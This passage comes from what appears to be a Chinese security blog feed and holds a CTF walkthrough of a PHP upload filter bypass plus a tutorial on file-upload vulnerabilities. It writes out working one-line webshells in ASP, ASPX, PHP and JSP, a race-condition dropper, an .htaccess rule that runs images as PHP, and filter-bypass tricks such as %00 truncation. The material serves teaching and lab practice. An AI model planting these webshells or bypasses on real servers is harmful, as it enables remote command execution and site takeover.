class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上最后一关和上传关系不大，这个题主要考查 PHP 代码审计，关于代码审计的题目实际上 XDebug 动态调试一下就可以很轻松的做出来，关于 XDebug 的配置文章可以参考国光我之前写的两篇文章：</p><ul><li><a href="https://www.sqlsec.com/2020/07/macphp.html">国光 - macOS 下优雅地配置 PHP 代码审计环境</a></li><li><a href="https://www.sqlsec.com/2020/09/xdebug.html">国光 - Xdebug + 宝塔 + PHPStudy+VScode PHP</a></li></ul><p>首先看第一个判断：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;black();&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以必须保证我们上传的表单 MIME 类型一定要符合标准。</p><p>接着对我们提交的 sava_name 的字符串进行处理，如果不是数组的话就以 <code>.</code> 为分隔，打散为数组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">  <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果是<strong>数组的话就无需打散</strong>，这里比较关键，后面再详细说，先记着。</p><p>因为打散后会校验最后的后缀：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;black();&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果不是合法后缀的话直接就报错了，所以我们老老实实的传入合法的字符串类型的不行的，这里的传入一个数组。比如这样的数组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = [<span class="number">0</span>=&gt;<span class="string">&#x27;shell.php/&#x27;</span>, <span class="number">2</span>=&gt;<span class="string">&#x27;png&#x27;</span>]</span><br></pre></td></tr></table></figure><p>这样执行完最后的拼接文件名的代码后：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line"><span class="variable">$file_name</span> = <span class="string">&#x27;shell.php/&#x27;</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="number">2</span> - <span class="number">1</span>]; = <span class="string">&#x27;shell.php/&#x27;</span>.<span class="string">&#x27;&#x27;</span> = <span class="string">&#x27;shell.php/.&#x27;</span></span><br></pre></td></tr></table></figure><p>这样最后一步：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">PHPmove_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)</span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="string">&#x27;xx/xx/shell/php/.&#x27;</span>)  </span><br></pre></td></tr></table></figure><p>结合前面的 move_uploaded_file 函数缺陷，会忽略掉文件末尾的 <code>/.</code>，所以最终就可以成功将 webshell 上传。</p><p>那么最终构造的数据包如下：</p><p><img src="https://image.3001.net/images/20201026/16036832903333.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 密码爆破 </tag>
            
            <tag> 题目详解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞</title>
      <link href="/posts/undefined/sec2/"/>
      <url>/posts/undefined/sec2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>现代互联网的Web应用程序中，上传文件是一种常见的功能，因为它有助于提高业务效率，比如<strong>企业的OA系统，允许用户上传图片、视频、头像和许多其他类D的文件</strong>。然而向用户提供的功能越多，Web应用受到攻击的风险就越大，如果Web应用存在文件上传漏洞，那么恶意用户就可以<strong>利用文件上传漏洞将可执行脚本程序(WebShell)上传到服务器中，获得网站的权限</strong>，然后可以<strong>进一步对服务器进行入侵</strong>，扩大控制权限。</p><h3 id="产生的原因"><a href="#产生的原因" class="headerlink" title="产生的原因"></a>产生的原因</h3><p>上传文件时，如果服务端代码没有对客户端上传的文件进行严格的验证和过滤，就容易造成可以<strong>上传任意文件</strong>的情况，包括上传脚本文件(asp、aspx、php、jsp等格式的文件)。</p><h3 id="漏洞的危害"><a href="#漏洞的危害" class="headerlink" title="漏洞的危害"></a>漏洞的危害</h3><p>非法用户可以利用<strong>上传的恶意脚本文件控制整个网站，甚至控制服务器</strong>。这个恶意的脚本文件，又被称为<strong>WebShell</strong>，也可将<strong>WebShell脚本称为一种网页后门</strong>, WebShell脚本具有非常强大的<strong>功能</strong>，比如<strong>查看服务器目录、服务器中的文件，执行系统命令</strong>等。<br>WebShell 就是以ASP、PHP、JSP等网页脚本存在的一种命令执行环节，通常也叫做<strong>网页后门</strong>。攻击者在<strong>入侵了一个网站后</strong>，通常<strong>会将WebShell上传到网站的根目录下或者插入到正常的网页中</strong>，然后<strong>使用浏览器或者对应的WebShell客户端来访问这些后门，将会得到一个命令执行的环境，以达到控制网站服务器的目的。</strong></p><h2 id="不同类型漏洞代码"><a href="#不同类型漏洞代码" class="headerlink" title="不同类型漏洞代码"></a>不同类型漏洞代码</h2><ul><li><p>ASP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval request(&quot;x&quot;)%&gt;</span><br></pre></td></tr></table></figure></li><li><p>ASPX</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item [&quot;x&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure></li><li><p>PHP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])；<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>JSP CMD WebShell</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;x&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">java.io.InputStream in=Runtime,getRuntime().exec(request.getParameter(<span class="string">&quot;i&quot;</span>)).getInp inta=-<span class="number">1</span>;</span><br><span class="line"><span class="type">byte</span>[]b=<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>((a=in.read(b))！=-<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b));</span><br><span class="line">&#125;</span><br><span class="line">out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>)；</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="上传漏洞攻击满足的条件"><a href="#上传漏洞攻击满足的条件" class="headerlink" title="上传漏洞攻击满足的条件"></a>上传漏洞攻击满足的条件</h2><ol><li>上传的文件<strong>能够被Web容器解释执行</strong>。所以文件上传后<strong>所在的目录要是Web容器所覆盖到的路径</strong>。</li><li>用户能够<strong>从 Web上访问这个文件</strong>。如果文件上传了，但用户无法通过Web访问，或者无法使得Web容器解释这个脚本，那么也不能称之为漏洞。</li><li>查看上传的文件是否被<strong>安全检查、格式化、图片压缩</strong>，改变了内容，则也可能导致攻击不成功。</li></ol><h2 id="中国蚁剑：antsword-使用的是POST接受参数，PHP木马使用的eval"><a href="#中国蚁剑：antsword-使用的是POST接受参数，PHP木马使用的eval" class="headerlink" title="中国蚁剑：antsword 使用的是POST接受参数，PHP木马使用的eval"></a>中国蚁剑：antsword 使用的是POST接受参数，PHP木马使用的eval</h2><h2 id="文件上传题目"><a href="#文件上传题目" class="headerlink" title="文件上传题目"></a>文件上传题目</h2><h3 id="1-JS-永远不要相信用户的输入"><a href="#1-JS-永远不要相信用户的输入" class="headerlink" title="1. JS - 永远不要相信用户的输入"></a>1. JS - 永远不要相信用户的输入</h3><p>“永远不要相信用户的输入”是进行安全设计和安全编码的重要准则。换句话说，任何输入数据在证明其无害之前，都是有害的。许多危险的漏洞就是因为过于相信用户的输入是善意的而导致的。</p><ol><li>禁用JS</li><li><strong>BP改包</strong></li><li>JS调试</li><li>使用 BP 修改返回包内容</li></ol><h3 id="2-解析规则-Apache-中-htaccess"><a href="#2-解析规则-Apache-中-htaccess" class="headerlink" title="2.解析规则 - Apache 中 .htaccess"></a>2.解析规则 - Apache 中 .htaccess</h3><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现:网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p><ul><li>White白名单：只允许某些类型的文件上传</li><li>Blacklist黑名单列表：不允许某些类型文件上传</li><li><strong>把png当做木马解析  然后就能解析到图</strong>片</li><li><strong>设置解析规则命令</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat .htaccess</span><br><span class="line">AddType application/ x-httpd-php .png</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-MIME-媒体类型"><a href="#3-MIME-媒体类型" class="headerlink" title="3.MIME - 媒体类型"></a>3.MIME - 媒体类型</h3><p>媒体类型（通常称为MultipurposeInternetMalExtensions 或MNE类型）是一种标准，用来表示文档、文件或字节流的性质和格式。</p><ul><li>MNE的组成结构非常简单﹔由类型与子类型两个字符串中间用′分隔而组成。不允许空格存在。type表示可以被分多个子类的独立类别。subtype表示细分后的每个类型。</li><li>通用结构:type&#x2F;subtype</li><li><strong>方法：修改图片类型，或者修改后缀</strong></li></ul><h3 id="4-文件头-文件头绕过"><a href="#4-文件头-文件头绕过" class="headerlink" title="4.文件头 - 文件头绕过"></a>4.文件头 - 文件头绕过</h3><p>一个文件里面的内容到底是啥?用惯了Windows的人肯定是看后缀。但是后缀这个东西说改就改，不可靠。所以，最保险的还是把文件类型信息写到文件里面，通常来说，也就是写到文件开头的那几个字节。这是最方便，最快捷的用来辨别一个文件真实内容的方法。</p><table><thead><tr><th>文件名</th><th></th><th>文件头(16进制)</th></tr></thead><tbody><tr><td>JPEG</td><td>ipg</td><td>FFD8FF</td></tr><tr><td>PNG</td><td>png</td><td>89504E47</td></tr><tr><td>GIF</td><td>gif</td><td>47494638</td></tr><tr><td>HTML</td><td>html</td><td>68746D6C3E</td></tr><tr><td>ZIP Archive</td><td>zip</td><td>504B0304</td></tr><tr><td>RAR Archive</td><td>rar</td><td>52617221</td></tr><tr><td>Adobe Acrobat</td><td>pdf</td><td>255044462D312E</td></tr><tr><td>MS Word&#x2F;Exce</td><td>xls.ordod</td><td>DOCF11E0</td></tr></tbody></table><ul><li><strong>方法：生成图片木马</strong></li><li><ol><li>png + php 合成png图马</li></ol></li><li>copy 1.png + 2.php&#x2F;a 3.png</li><li><ol start="2"><li>将shell.php内容追加到pic.php<br>cat shell.php &gt;&gt; pic.png</li></ol></li><li><ol start="3"><li>直接echo追加<br>echo ‘<?php phpinfo();?>‘ &gt;&gt; pic.png</li></ol></li></ul><h3 id="5-缺陷代码-1"><a href="#5-缺陷代码-1" class="headerlink" title="5.缺陷代码 - 1"></a>5.缺陷代码 - 1</h3><p>网络安全永远处于一个发展更新的状态。因为漏洞是依赖于产品的，产品更新换代，漏洞也会更新换代。而且安全，实际上它是一个博弈的过程，永远有更强的聪明小伙想要制造点新麻烦。如果要是想一劳永逸的话，这个行业可能并不适合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$blacklist</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>，<span class="string">&quot;php5&quot;</span>，<span class="string">&quot;php4&quot;</span>,“<span class="string">&quot;php3&quot;</span>，<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>，<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$blacklist</span>，<span class="string">&quot;&quot;</span>，<span class="variable">$nalie</span> ) ;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[ <span class="string">&#x27;file&#x27;</span>][ <span class="string">&#x27; tmp_name &#x27;</span> ]，UPLOAD_PATH . <span class="variable">$name</span> ))</span><br></pre></td></tr></table></figure><p><strong>题目会将名单中的格式替换为空 格式不区分大小写</strong></p><ul><li><strong>方法</strong>：shell.php - &gt; shell.pphphp</li></ul><h3 id="6-缺陷代码-2"><a href="#6-缺陷代码-2" class="headerlink" title="6.缺陷代码 - 2"></a>6.缺陷代码 - 2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$blacklist</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>，<span class="string">&quot;php5&quot;</span>，<span class="string">&quot;php4&quot;</span>,“<span class="string">&quot;php3&quot;</span>，<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>，<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$blacklist</span>，<span class="string">&quot;&quot;</span>，<span class="variable">$nalie</span> ) ;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[ <span class="string">&#x27;file&#x27;</span>][ <span class="string">&#x27; tmp_name &#x27;</span> ]，UPLOAD_PATH . <span class="variable">$name</span> ))</span><br></pre></td></tr></table></figure><p><strong>题目会将名单中的格式替换为空格  格式区分大小写</strong></p><ul><li><strong>方法</strong> ：改变格式大小写</li></ul><h3 id="7-GET-型-00-截断"><a href="#7-GET-型-00-截断" class="headerlink" title="7.GET 型 00 截断"></a>7.GET 型 00 截断</h3><p>PHP内核是由C语言实现的，所以使用了C语言中的一些字符串处理函数。比如在连接字符串时候，0字节（\x00)将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串</p><ul><li>这种方法只适用于<br> magicquotes-gpc &#x3D; Off<br>PHP版本小于5.3.4</li><li><strong>题目会将上传的文件重命名保存</strong></li><li><strong>方法</strong>：用BP截断后添加 X.png%00 进行截断上传</li></ul><h3 id="8-POST-型-00-截断"><a href="#8-POST-型-00-截断" class="headerlink" title="8.POST 型 00 截断"></a>8.POST 型 00 截断</h3><p>需要手动解码</p><ul><li><strong>方法</strong>：添加X.php%00后选中 %00 进行转码选择转成url</li><li>或者输入空格十六进制进制改为00</li></ul><h3 id="9-黑名单缺陷"><a href="#9-黑名单缺陷" class="headerlink" title="9.黑名单缺陷"></a>9.黑名单缺陷</h3><p>白名单是设置能通过的用户，白名单以外的用户都不能通过。黑名单是设置不能通过的用户，黑名单以外的用户都能通过。所以—般情况下白名单比黑名单限制的用户要更多—些</p><ul><li><strong>方法</strong>：BP拦截修改后缀名再放包</li></ul><h3 id="10-条件竞争"><a href="#10-条件竞争" class="headerlink" title="10.条件竞争."></a>10.条件竞争.</h3><p><strong>事件的先后顺序不会影响一个系统的运行结</strong>果。当这些不受控制的事件并<strong>没有按照开发者想要的方式运行</strong>时，就可能会出现bug。尤其在当前我们的系统中大量对资源进行共享，如果处理不当的话，就会产生条件<strong>竞争漏洞</strong>。<br>攻击者上传了一个用来生成恶意shell的文件，在上传完成和安全检查完成并删除它的间隙，攻击者通过不断地发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意shell的文件。至此，该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把它删除的问题都已经不重要了，因为攻击者已经成功的在服务器中植入了一个shell 文件，后续的一切就都不是问题了。<br>不过竞争的马因为生存周期短的原因，所以和普通的webshell不太一样，他的使命是在有限的生命中等待一个有缘人的光顾，然后快速生成一个小Webshell，落红不是无情物，化作春泥更护花（泪目）。这类的webshell内容大体上如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;xiao.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>不允许直接上传</li><li>先上传再判断然后操作</li><li>CPU - &gt; 时间差</li><li>条件竞争 - &gt; 短时间内多线程大量请求(上传)</li><li><strong>母马-&gt;解析-&gt;释放子马</strong></li><li><ol><li>挑选天选之马(木马)  访问时会将母马写入xaio.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;xiao.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol></li><li><ol start="2"><li>需要条件竞争大量快速上传木马到服务器<br>如果不够快 母马就会被 kill 掉</li></ol></li><li><ol start="3"><li>母马需要被解析(条件竞争访问)<br>如果木马上传成功 但是没有访问就不会触发解析 不解析就没有任何作用</li></ol></li><li><ol start="4"><li>访问母马释放出来的子马即可 getshell</li></ol></li></ul><h3 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h3><p>目前很多网站都会对用户上传的图片再次压缩、裁剪等渲染操作，所以普通的图片马都难逃被渲染的悲剧，那么有没有那种可以绕过渲染的图片呢?</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>( <span class="variable">$upload_file</span>);</span><br><span class="line"><span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>( <span class="variable">$upload_file</span>);</span><br><span class="line"><span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>( <span class="variable">$upload_file</span>);</span><br></pre></td></tr></table></figure><ol><li>GIF 头部不会被渲染<br>渲染前后的两张GIF，没有发生变化的数据库部分直接插入 Webshell即可</li><li>PNG 对应的脚本绕过<br>PNG没有GIF那么简单，需要将数据写入到PLTE数据块或者<strong>IDAT 数据块</strong></li><li>JPG<br>JPG也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试</li></ol><ul><li><p>渲染两次会返回正确木马</p></li><li><p>JPG坑点总结</p></li><li><ol><li>需要被imagecreatefromjpeg渲染或再用工具</li></ol></li><li><ol start="2"><li>图片找的稍微大一点成功率更高</li></ol></li><li><ol start="3"><li>Payload语句越短成功率越高</li></ol></li><li><ol start="4"><li>一张图片不行就换一张不要死磕</li></ol></li><li><ol start="5"><li>国光补充:貌似白色的图片成功率也比较高</li></ol></li><li><ol start="6"><li><?php $_GET[0]($_POST[1]);?> 这种payload成功率很高</li></ol></li></ul><h3 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file"></a>move_uploaded_file</h3><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试</title>
      <link href="/posts/undefined/sec1/"/>
      <url>/posts/undefined/sec1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p>渗透测试(Penetration Testing)是指受信任的第三方通过模拟黑客的攻击技术与手段对目标网络、系统进行攻击测试，发现目标的安全隐患并给出安全加固建议的一种安全测试与评估方法。</p><h2 id="信息收集技术"><a href="#信息收集技术" class="headerlink" title="信息收集技术"></a>信息收集技术</h2><p>信息收集是渗透测试的第一阶段。在这个阶段，渗透人员需要使用各种方法尽可能地获取到目标资产的相关信息。渗透测试人员可以使用诸如百度或者谷歌这类的传统式搜索引擎来收集信息，也可以借助如<strong>Shodan、Zoomeye</strong>或者<strong>FQFA</strong>这类的物联网搜索引擎，甚至还可以直接使用本地的工具对目标资产进行<strong>操作系统探测、端口扫描、Webr目录扫描、Web指纹识别</strong>等。收集的信息越多，渗透测试成功的概率越高，所以业内常流传着这样一句话“<strong>渗透测试的本质就是信息收集</strong>”。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>信息收集的方式可以分为两种:<strong>主动</strong>和<strong>被动</strong>。</p><ol><li>主动:通过直接访问、扫描网站，这种将流量流经网站的行为。（缺点  会留下痕迹）</li><li>被动:利用第三方暴露在外，主要是互联网的信息进行收集。</li></ol><h3 id="常规收集"><a href="#常规收集" class="headerlink" title="常规收集"></a>常规收集</h3><ul><li><strong>备份文件泄露</strong><br><strong>通过对目录扫描</strong><br>备份文件与缓存文件泄露</li><li><strong>robots.txt泄露</strong></li></ul><h3 id="从信息泄密到未授权访问"><a href="#从信息泄密到未授权访问" class="headerlink" 